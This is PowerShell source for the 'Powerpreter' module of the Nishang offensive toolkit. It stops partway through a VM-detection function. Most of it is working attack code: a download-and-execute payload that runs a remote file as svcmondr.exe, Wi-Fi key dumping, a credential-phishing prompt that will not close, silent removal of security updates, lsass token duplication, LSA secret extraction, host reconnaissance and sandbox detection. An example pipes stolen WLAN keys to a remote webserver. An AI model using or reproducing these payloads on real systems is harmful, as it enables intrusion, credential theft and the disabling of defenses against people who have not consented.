﻿<#
.SYNOPSIS
Powerpreter is a module written in powershell. Powerpreter makes available maximum possible functionality of nishang
in a single script. This is much helpful in scenarios like phishing attacks and webshells.

.DESCRIPTION
Powerpreter is a script module which makes it useful in scenarios like drive-by-download, document attachments, webshells etc. where one
may like to pull all the functionality in Nishang in a single file or deployment is not easy to do. Powerpreter has persistence
capabilities too. See examples for help in using it.

.EXAMPLE
PS > Import-Module .\Powerpreter.psm1
PS> Get-Command -Module powerpreter

The first command imports the module in current powershell session. Ignore the Unapproved verbs warning.
The second command lists all the functions available with powerpreter.

.EXAMPLE
PS > Import-Module .\Powerpreter.psm1; Enable-DuplicateToken; Get-LSASecret

Use above command to import powerpreter in current powershell session and execute the two functions.

.EXAMPLE
PS > Import-Module .\Powerpreter.psm1; Persistence

Use above for reboot persistence

.EXAMPLE
PS > Import-Module .\Powerpreter.psm1
PS > Get-WLAN-Keys | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php

Use above for exfiltration to a webserver which logs POST requests.


.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang


#>
######################################################Download a file to the target.##################################################

function Download
{

<#
.SYNOPSIS
Payload to Download a file in current users temp directory.

.DESCRIPTION
This payload downloads a file to the given location.

.PARAMETER URL
The URL from where the file would be downloaded.

.PARAMETER FileName
Name of the file where download would be saved.

.EXAMPLE
PS > Download http://example.com/file.txt newfile.txt

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FileName
    )
    $webclient = New-Object System.Net.WebClient
    $file = "$env:temp\$FileName"
    $webclient.DownloadFile($URL,$file)
}

#################################Download an executable in text format, convert it to exe and execute it.#################################
function Download_Execute
{

<#
.SYNOPSIS
Payload to download an executable in text format, convert it to executable and execute.

.DESCRIPTION
This payload downloads an executable in text format, converts it to executable and execute.
Use exetotext.ps1 script to change an executable to text

.PARAMETER URL
The URL from where the file would be downloaded.

.EXAMPLE
PS > Download_Execute http://example.com/file.txt

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>



    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL
    )
    $webclient = New-Object System.Net.WebClient
    [string]$hexformat = $webClient.DownloadString($URL) 
    [Byte[]] $temp = $hexformat -split ' ' 
    [System.IO.File]::WriteAllBytes("$env:temp\svcmondr.exe", $temp) 
    start-process -nonewwindow "$env:temp\svcmondr.exe" 
}

##########################Dumps keys in clear text for saved WLAN profiles.#########################################
function Get-Wlan-Keys 
{

<#
.SYNOPSIS
Payload which dumps keys for WLAN profiles.

.DESCRIPTION
This payload dumps keys in clear text for saved WLAN profiles.
The payload must be run from as administrator to get the keys.

.EXAMPLE
PS > Get-WLAN-Keys

.LINK
http://poshcode.org/1700
https://github.com/samratashok/nishang
#>


    [CmdletBinding()]
    Param ()
    $wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
    $exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
    $pastevalue = $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
    $pastevalue
}


#################################################Gathers juicy information from the target##########################################################
function Get-Information 
{


<#
.SYNOPSIS
Payload which gathers juicy information from the target.

.DESCRIPTION
This payload extracts information form registry and some commands. The information available would be dependent on the privilege with
which the script would be executed.

.EXAMPLE
PS > Get-Information

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>

    function registry_values($regkey, $regvalue,$child) 
    { 
        if ($child -eq "no"){$key = get-item $regkey} 
        else{$key = get-childitem $regkey} 
        $key | 
        ForEach-Object { 
            $values = Get-ItemProperty $_.PSPath 
            ForEach ($value in $_.Property) 
            { 
                if ($regvalue -eq "all") {$values.$value} 
                elseif ($regvalue -eq "allname"){$value} 
                else {$values.$regvalue;break} 
            }
        }
    } 
    
    $output = "Logged in users:`n" + ((registry_values "hklm:\software\microsoft\windows nt\currentversion\profilelist" "profileimagepath") -join "`r`n") 
    $output = $output + "`n`n Powershell environment:`n" + ((registry_values "hklm:\software\microsoft\powershell" "allname")  -join "`r`n") 
    $output = $output + "`n`n Putty trusted hosts:`n" + ((registry_values "hkcu:\software\simontatham\putty" "allname")  -join "`r`n") 
    $output = $output + "`n`n Putty saved sessions:`n" + ((registry_values "hkcu:\software\simontatham\putty\sessions" "all")  -join "`r`n") 
    $output = $output + "`n`n Recently used commands:`n" + ((registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Shares on the machine:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\LanmanServer\Shares" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Environment variables:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n More details for current user:`n" + ((registry_values "hkcu:\Volatile Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n SNMP community strings:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n SNMP community strings for current user:`n" + ((registry_values "hkcu:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications for current user:`n" + ((registry_values "hkcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Domain Name:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Contents of /etc/hosts:`n" + ((get-content -path "C:\windows\System32\drivers\etc\hosts")  -join "`r`n") 
    $output = $output + "`n`n Running Services:`n" + ((net start) -join "`r`n") 
    $output = $output + "`n`n Account Policy:`n" + ((net accounts)  -join "`r`n") 
    $output = $output + "`n`n Local users:`n" + ((net user)  -join "`r`n") 
    $output = $output + "`n`n Local Groups:`n" + ((net localgroup)  -join "`r`n") 
    $output = $output + "`n`n WLAN Info:`n" + ((netsh wlan show all)  -join "`r`n") 
    
    $output

}

#####################################Displays a credential prompt and doesn't go away till valid credentials are entered##################

function Invoke-CredentialsPhish
{
<#
.SYNOPSIS
Function which opens a user credential prompt.

.DESCRIPTION
This payload opens a prompt which asks for user credentials and
does not go away till valid credentials are entered in the prompt.


.EXAMPLE
PS > Invoke-CredentialsPhish

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>

[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
                $output
                break
            }
        }
    }
}





####################################Silently removes updates for a target machine.########################################################
###Thanks Trevor Sullivan
###http://trevorsullivan.net/2011/05/31/powershell-removing-software-updates-from-windows/
function Remove-Update {

<#
.SYNOPSIS
Payload which silently removes updates for a target machine.

.DESCRIPTION
This payload removes updates from a tagret machine. This could be 
used to remove all updates, all security updates or a particular update.

.PARAMETER KBID
THE KBID of update you want to remove. All and Security are also validd.

.EXAMPLE
PS > Remove-Update All
This removes all updates from the target.

.EXAMPLE
PS > Remove-Update Security
This removes all security updates from the target.

.EXAMPLE
PS > Remove-Update KB2761226
This removes KB2761226 from the target.

.LINK
http://trevorsullivan.net/2011/05/31/powershell-removing-software-updates-from-windows/
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $KBID
    )
    $HotFixes = Get-HotFix

    foreach ($HotFix in $HotFixes)
    {

        if ($KBID -eq $HotFix.HotfixId)
        {
            $KBID = $HotFix.HotfixId.Replace("KB", "") 
            $RemovalCommand = "wusa.exe /uninstall /kb:$KBID /quiet /norestart"
            Write-Host "Removing $KBID from the target."
            Invoke-Expression $RemovalCommand
            break
        }
    
        if ($KBID -match "All")
        {
            $KBNumber = $HotFix.HotfixId.Replace("KB", "")
            $RemovalCommand = "wusa.exe /uninstall /kb:$KBNumber /quiet /norestart"
            Write-Host "Removing update $KBNumber from the target."
            Invoke-Expression $RemovalCommand
        
        }
    
        if ($KBID -match "Security")
        {
            if ($HotFix.Description -match "Security")
            {
        
                $KBSecurity = $HotFix.HotfixId.Replace("KB", "")
                $RemovalCommand = "wusa.exe /uninstall /kb:$KBSecurity /quiet /norestart"
                Write-Host "Removing Security Update $KBSecurity from the target."
                Invoke-Expression $RemovalCommand
            }
        }
    

        while (@(Get-Process wusa -ErrorAction SilentlyContinue).Count -ne 0)
        {
            Start-Sleep 3
            Write-Output "Waiting for update removal to finish ..."
        }
    }

}


##########################Duplicates the Access token of lsass (SYSTEM) and sets it in the current process thread.###################################
####Thanks Niklas Goude#####
####http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
function Enable-DuplicateToken { 

<# 
.SYNOPSIS 
Payload which duplicates the Access token of lsass and sets it in the current process thread. 
 
.DESCRIPTION 
This payload duplicates the Access token of lsass and sets it in the current process thread. 
The payload must be run with elevated permissions. 

.EXAMPLE 
PS > Enable-DuplicateToken
 
.LINK 
http://www.truesec.com 
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
https://github.com/samratashok/nishang

.NOTES 
Goude 2012, TreuSec 
#> 


[CmdletBinding()] 
param() 
 
$signature = @" 
    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
     public struct TokPriv1Luid 
     { 
         public int Count; 
         public long Luid; 
         public int Attr; 
     } 
 
    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
    public const int TOKEN_QUERY = 0x00000008; 
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
 
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
      TOKEN_ADJUST_SESSIONID); 
 
    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
    public const int ANYSIZE_ARRAY = 1; 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID 
    { 
      public UInt32 LowPart; 
      public UInt32 HighPart; 
    } 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID_AND_ATTRIBUTES { 
       public LUID Luid; 
       public UInt32 Attributes; 
    } 
 
 
    public struct TOKEN_PRIVILEGES { 
      public UInt32 PrivilegeCount; 
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
      public LUID_AND_ATTRIBUTES [] Privileges; 
    } 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
    [return: MarshalAs(UnmanagedType.Bool)] 
    public static extern bool SetThreadToken( 
      IntPtr PHThread, 
      IntPtr Token 
    ); 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     [return: MarshalAs(UnmanagedType.Bool)] 
      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
       UInt32 DesiredAccess, out IntPtr TokenHandle); 
 
    [DllImport("advapi32.dll", SetLastError = true)] 
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
 
    [DllImport("kernel32.dll", ExactSpelling = true)] 
    public static extern IntPtr GetCurrentProcess(); 
 
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
"@ 
 
  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
  if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
    Write-Warning "Run the Command as an Administrator" 
    Break 
  } 
 
  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
  $adjPriv = [AdjPriv.AdjPriv] 
  [long]$luid = 0 
 
  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
  $tokPriv1Luid.Count = 1 
  $tokPriv1Luid.Luid = $luid 
  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
 
  $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
  
  [IntPtr]$htoken = [IntPtr]::Zero 
  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
   
   
  $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
  $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
 
  if(-not($retVal)) { 
    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
    Break 
  } 
 
  $process = (Get-Process -Name lsass) 
  [IntPtr]$hlsasstoken = [IntPtr]::Zero 
  $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
 
  [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
  $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
  
  $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
  if(-not($retVal)) { 
    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
  } 
}

######################################################Dumps LSA Secrets from the target#############################################
####Thanks Niklas Goude#####
####http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/06/use-powershell-to-decrypt-lsa-secrets-from-the-registry.aspx
function Get-LsaSecret {

<#
.SYNOPSIS
Payload which extracts LSA Secrets from local computer.

.DESCRIPTION
Extracts LSA secrets from HKLM:\\SECURITY\Policy\Secrets\ on a local computer.
The payload must be run with elevated permissions, in 32-bit mode and requires 
permissions to the security key in HKLM. The permission could be obtained by using
Enable-DuplicateToken payload.

.PARAMETER RegistryKey
Name of Key to Extract. if the parameter is not used, all secrets will be displayed.

.EXAMPLE
PS > Get-LsaSecret

.EXAMPLE
PS > Get-LsaSecret -RegistryKey KeyName
Read contents of the key mentioned as parameter.

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/06/use-powershell-to-decrypt-lsa-secrets-from-the-registry.aspx
https://github.com/samratashok/nishang

.NOTES
Goude 2012, TreuSec
#>

 [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory=$False)]
        [String]
        $RegistryKey
    )

    Begin {
    # Check if User is Elevated
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
      Write-Warning "Run the Command as an Administrator"
      Break
    }

    # Check if Script is run in a 32-bit Environment by checking a Pointer Size
    if([System.IntPtr]::Size -eq 8) {
      Write-Warning "Run PowerShell in 32-bit mode"
      Break
    }



    # Check if RegKey is specified
    if([string]::IsNullOrEmpty($registryKey)) {
      [string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
    }

    # Create Temporary Registry Key
    if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) {
      mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
    }

    $signature = @"
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_UNICODE_STRING
    {
      public UInt16 Length;
      public UInt16 MaximumLength;
      public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_OBJECT_ATTRIBUTES
    {
      public int Length;
      public IntPtr RootDirectory;
      public LSA_UNICODE_STRING ObjectName;
      public uint Attributes;
      public IntPtr SecurityDescriptor;
      public IntPtr SecurityQualityOfService;
    }

    public enum LSA_AccessPolicy : long
    {
      POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
      POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
      POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
      POLICY_TRUST_ADMIN = 0x00000008L,
      POLICY_CREATE_ACCOUNT = 0x00000010L,
      POLICY_CREATE_SECRET = 0x00000020L,
      POLICY_CREATE_PRIVILEGE = 0x00000040L,
      POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
      POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
      POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
      POLICY_SERVER_ADMIN = 0x00000400L,
      POLICY_LOOKUP_NAMES = 0x00000800L,
      POLICY_NOTIFICATION = 0x00001000L
    }

    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaRetrievePrivateData(
      IntPtr PolicyHandle,
      ref LSA_UNICODE_STRING KeyName,
      out IntPtr PrivateData
    );

    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaStorePrivateData(
      IntPtr policyHandle,
      ref LSA_UNICODE_STRING KeyName,
      ref LSA_UNICODE_STRING PrivateData
    );

    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaOpenPolicy(
      ref LSA_UNICODE_STRING SystemName,
      ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
      uint DesiredAccess,
      out IntPtr PolicyHandle
    );

    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaNtStatusToWinError(
      uint status
    );

    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaClose(
      IntPtr policyHandle
    );

    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaFreeMemory(
      IntPtr buffer
    );
"@

    Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
    }

      Process{
        foreach($key in $RegistryKey) {
          $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
          $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
          $myKey = "MySecret"
          if(Test-Path $regPath) {
            Try {
              Get-ChildItem $regPath -ErrorAction Stop | Out-Null
            }
            Catch {
              Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
              Break
            }      

            if(Test-Path $regPath) {
              # Copy Key
              "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
                $copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
                $copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_

                if( -not(Test-Path $copyTo) ) {
                  mkdir $copyTo | Out-Null
                }
                $item = Get-ItemProperty $copyFrom
                Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
              }
            }
            # Attributes
            $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
            $objectAttributes.Length = 0
            $objectAttributes.RootDirectory = [IntPtr]::Zero
            $objectAttributes.Attributes = 0
            $objectAttributes.SecurityDescriptor = [IntPtr]::Zero
            $objectAttributes.SecurityQualityOfService = [IntPtr]::Zero

            # localSystem
            $localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
            $localsystem.Buffer = [IntPtr]::Zero
            $localsystem.Length = 0
            $localsystem.MaximumLength = 0

            # Secret Name
            $secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
            $secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
            $secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
            $secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)

            # Get LSA PolicyHandle
            $lsaPolicyHandle = [IntPtr]::Zero
            [LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
            $lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)

            if($lsaOpenPolicyHandle -ne 0) {
              Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
              Continue
            }

            # Retrieve Private Data
            $privateData = [IntPtr]::Zero
            $ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)

            $lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)

            $lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)

            if($lsaNtStatusToWinError -ne 0) {
              Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
            }

            [LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
            [LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [System.Type][LSAUtil.LSAUtil+LSA_UNICODE_STRING])

            Try {
              [string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
              $value = $value.SubString(0, ($lusSecretData.Length / 2))
            }
            Catch {
              $value = ""
            }

            if($key -match "^_SC_") {
              # Get Service Account
              $serviceName = $key -Replace "^_SC_"
              Try {
                # Get Service Account
                $service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
                $account = $service.StartName
              }
              Catch {
                $account = ""
              }
            } else {
              $account = ""
            }

            # Return Object
           $obj = New-Object PSObject -Property @{
              Name = $key;
              Secret = $value;
              Account = $Account
            } 
        
            $pastevalue = $obj | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
            $pastevalue

          } else {
            Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
          }
        }
      }
      end {
        if(Test-Path $tempRegPath) {
          Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
        }
       if($exfil -eq $True)
       {
            Do-Exfiltration "LSA Secrets: " "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
       }
      }

    }

######################################################Converts Base64 string or file to plain.##################################################
function Base64ToString
{

<#
.SYNOPSIS
Helper funciton which decodes a base64 string to readable.

.DESCRIPTION
This payload decodes a base64 string to readable.

.PARAMETER Base64Strfile
The filename which contains base64 string to be decoded.
Use the parameter -IsString while using a string instead of file.

.EXAMPLE
PS > Base64ToString base64.txt

.EXAMPLE
PS > Base64ToString dGVzdGVzdA== -IsString

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Base64Strfile, 
        
        [Switch] 
        $IsString
    )

    if($IsString -eq $true)
    {
    
        $base64string  = [System.Convert]::FromBase64String($Base64Strfile)
       
    }
    else
    {
        $base64string  = [System.Convert]::FromBase64String((Get-Content $Base64Strfile))
    }
    
    $decodedstring = [System.Text.Encoding]::Unicode.GetString($base64string)
    $decodedstring
    }



########################################################Detects whether it is in a known virtual machine.###########################
###Based on CheckVM post module in msf by Carlos Perez
function Check-VM
{

<# 
.SYNOPSIS 
Helper function which detects whether it is running in a known virtual machine.
 
.DESCRIPTION 
This script uses known parameters or 'fingerprints' of Hyper-V, VMWare, Virtual PC, Virtual Box,
Xen and QEMU for detecting the environment.

.EXAMPLE 
PS > Check-VM 
 
.LINK 
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang

.NOTES 
The script draws heavily from checkvm.rb post module from msf.
https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/checkvm.rb
#>
    [CmdletBinding()] Param()
    $ErrorActionPreference = "SilentlyContinue"
    #Hyper-V
    $hyperv = Get-ChildItem HKLM:\SOFTWARE\Microsoft
    if (($hyperv -match "Hyper-V") -or ($hyperv -match "VirtualMachine"))
        {
            $hypervm = $true
        }

    if (!$hypervm)
        {
            $hyperv = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
            if ($hyperv -match "vrtual")
                {
                    $hypervm = $true
                }
        }
    
    if (!$hypervm)
        {
            $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
            if ($hyperv -match "vrtual")
                {
                    $hypervm = $true
                }
        }
            
    if (!$hypervm)
        {
            $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
            if ($hyperv -match "vrtual")
                {
                    $hypervm = $true
                }
        }

    if (!$hypervm)
        {
            $hyperv = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
            if (($hyperv -match "vmicheartbeat") -or ($hyperv -match "vmicvss") -or ($hyperv -match "vmicshutdown") -or ($hyperv -match "vmiexchange"))
                {
                    $hypervm = $true
                }
        }
   
    if ($hypervm)
        {
    
            "This is a Hyper-V machine."
    
        }

    #VMWARE

    $vmware = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
    if (($vmware -match "vmdebug") -or ($vmware -match "vmmouse") -or ($vmware -match "VMTools") -or ($vmware -match "VMMEMCTL"))
        {
            $vmwarevm = $true
        }

    if (!$vmwarevm)
        {
            $vmware = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System\BIOS -Name SystemManufacturer
            if ($vmware -match "vmware")
                {
                    $vmwarevm = $true
                }
        }
    
    if (!$vmwarevm)
        {
            $vmware = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
            if ($vmware -match "vmware")
                {
                    $vmwarevm = $true
                }
        }

    if (!$vmwarevm)
        {
            $vmware = Get-Process
            if (($vmware -eq "vmwareuser.exe") -or ($vmware -match "vmwaretray.exe"))
                {
                    $vmwarevm = $true
                }
        }

    if ($vmwarevm)
        {
    
            "This is a VMWare machine."
    
        }
    
    #Virtual PC

    $vpc = Get-Process
    if (($vpc -eq "vmusrvc.exe") -or ($vpc -match "vmsrvc.exe"))
        {
        $vpcvm = $true
        }

    if (!$vpcvm)
        {
            $vpc = Get-Process
            if (($vpc -eq "vmwareuser.exe") -or ($vpc -match "vmwaretray.exe"))
                {
                    $vpcvm = $true
                }
        }

    if (!$vpcvm)
        {
            $vpc = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
            if (($vpc -match "vpc-s3") -or ($vpc -match "vpcuhub") -or ($vpc -match "msvmmouf"))
                {
                    $vpcvm = $true
                }
        }

    if ($vpcvm)
        {
    
        "This is a Virtual PC."
    
        }


    #Virtual Box

    $vb = Get-Process
    if (($vb -eq "vboxservice.exe") -or ($vb -match "vboxtray.exe"))
        {
    
        $vbvm = $true
    
        }
    if (!$vbvm)
        {
            $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
            if ($vb -match "vbox_")
                {
                    $vbvm = $true
                }
        }

    if (!$vbvm)
        {
            $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
            if ($vb -match "vbox_")
                {
                    $vbvm = $true
                }
        }

    
    if (!$vbvm)
        {
            $vb = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
            if ($vb -match "vbox")
                {
                    $vbvm = $true
                }
        }



    if (!$vbvm)
        {
            $vb = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
